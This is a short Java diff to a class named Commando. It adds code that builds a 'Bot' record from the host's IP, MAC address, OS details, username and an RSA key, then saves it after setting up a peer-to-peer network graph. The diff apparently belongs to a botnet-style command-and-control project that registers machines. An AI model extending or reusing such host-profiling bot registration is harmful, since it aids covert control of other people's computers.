@@ -76,7 +76,17 @@ public class Commando {
 		nServ.updateDnsInformation();
 		graph = createNetworkP2P();
 		System.out.println("blab " + graph);
-
+		
+		Bot bot = new Bot(nServ.getIdHash(), 
+					nServ.getMyIp().toString(), 
+					nServ.getMac(),
+					nServ.getOs(), 
+					nServ.getVersionOS(), 
+					nServ.getArchOS(), 
+					nServ.getUsernameOS(),
+					pki.getPubRSAKey(),
+					nServ.isElegible());
+			bServ.save(bot);
 	}
 
 	/**
